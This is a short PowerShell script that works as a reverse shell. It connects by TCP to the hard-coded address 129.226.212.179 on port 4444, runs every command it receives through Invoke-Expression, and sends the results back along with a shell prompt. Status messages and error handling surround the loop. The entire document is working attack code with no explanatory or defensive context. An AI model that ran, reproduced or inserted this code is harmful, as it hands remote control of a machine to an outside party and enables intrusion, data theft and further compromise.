try {
    Write-Output "Attempting to connect to 129.226.212.179:4444"
    $client = New-Object System.Net.Sockets.TCPClient('129.226.212.179',4444);
    if (-not $client.Connected) {
        throw "Failed to connect to the remote host."
    }
    Write-Output "Connection established!"
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    };
} catch {
    Write-Output "Error: $_"
} finally {
    if ($client) { $client.Close(); Write-Output "Connection closed." }
}
